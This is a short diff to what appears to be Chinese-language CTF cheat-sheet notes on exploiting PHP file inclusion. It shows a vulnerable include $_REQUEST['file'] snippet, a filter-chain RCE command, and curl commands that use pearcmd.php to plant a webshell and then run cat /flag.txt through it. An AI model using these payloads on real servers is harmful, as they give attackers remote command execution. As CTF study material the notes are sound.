@@ -1530,9 +1530,8 @@ process.mainModule.require("express").response.send=function(){this.end(process.
 <?php
 include $_REQUEST['file'];
 ```
-
-当可以完全控制require/include的文件名时，就能使用[脚本](https://github.com/synacktiv/php_filter_chain_generator)获取rce payload:`python3 filter_chain.py —-chain '<?php system("cat /flag.txt");?>'`.或者使用pearcmd.php上传木马getshell。
-```
+当可以完全控制require/include的文件名时，就能使用[PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator)获取rce payload:`python3 filter_chain.py —-chain '<?php system("cat /flag.txt");?>'`.或者使用pearcmd.php上传木马getshell。参考[Ghazy Corp](https://hackmd.io/@abdinata/Website-Challenge-0xL4ughCTF-2024),控制file_get_contents的文件名也行
+```sh
 curl "http://example.com/?page=/usr/local/lib/php/pearcmd&+-c+/tmp/webshell.php+-d+man_dir=<?echo(system(\$_GET\['cmd'\]));?>+-s+"
 curl "http://example.com/?page=/tmp/webshell&cmd=cat+/flag.txt"
 ```
